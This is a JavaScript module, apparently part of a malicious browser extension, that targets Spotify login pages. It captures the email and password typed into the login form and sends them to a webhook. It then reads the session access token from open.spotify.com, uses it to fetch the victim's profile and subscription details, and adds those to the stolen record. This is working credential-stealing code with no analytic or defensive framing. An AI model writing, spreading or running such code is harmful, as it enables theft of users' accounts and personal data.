const Util = require('../../utils');
const { formatFields, code, getFooter, formatField } = require('../../utils/Webhook');
const { waitForElement } = require('../../utils/Document');
const variable = 'spotify_message_id';

module.exports = {
  webPattern: /https:\/\/(accounts|open)\.spotify\.com/g,
  urlsMatches: [
    {
      path: /\/[a-zA-Z-_]{2,5}\/login/g,
      async run() {
        (await waitForElement(this.getSelector('submit'))).addEventListener('click', async () => {
          const emailInput = document.querySelector(this.getSelector('emailInput'))?.value;
          const passwordInput = document.querySelector(this.getSelector('passwordInput'))?.value;
          if (!emailInput || !passwordInput) return;

          const { id } = await Util.Webhook.sendEmbed({
            title: 'New account has been added',
            fields: formatFields([
              ['Email', code(emailInput)],
              ['Password', code(passwordInput)],
            ]),
            footer: getFooter()
          });
          await chrome.storage.local.set({ [variable]: id });
        });
      }
    },
    {
      path: /\/([^*]+)?/g,
      async run() {
        const id = (await chrome.storage.local.get(variable))[variable];
        if (window.location.hostname !== 'open.spotify.com' || !id) return;

        const { embeds: [embed] } = await Util.Webhook.getMessage(id);
        const token = JSON.parse(document.querySelector('script#session')?.textContent || '{}').accessToken;
        const account = await (await fetch('https://api.spotify.com/v1/me', { headers: { Authorization: `Bearer ${token}` }
        })).json();

        embed.author = { name: account.display_name, icon_url: account.images.pop().url, url: account.external_urls.spotify };
        embed.fields[0].value = code(account.email);
        embed.fields.push(formatField(['Subscription', account.product]));
        await Util.Webhook.editEmbed(embed, id).then(async () => await chrome.storage.local.remove(variable));
      }
    }
  ],
  selectors: {
    emailInput: 'input#login-username',
    passwordInput: 'input#login-password',
    submit: 'button#login-button',
  }
};
